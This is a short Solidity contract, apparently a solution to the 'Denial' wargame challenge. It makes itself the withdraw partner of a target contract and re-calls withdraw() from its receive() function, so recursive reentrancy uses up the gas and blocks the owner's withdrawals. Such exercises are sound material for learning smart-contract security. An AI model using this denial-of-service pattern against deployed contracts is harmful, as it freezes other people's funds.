// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../denial/Denial.sol";
contract DenialHack {

    Denial denial;
    constructor (address instance) {
        denial = Denial(payable(instance));
        denial.setWithdrawPartner(address(this));
       
    }
    // allow deposit of funds
    receive() external payable {
        payable(address(denial)).call{value:msg.value}("");
        denial.withdraw();
    }
}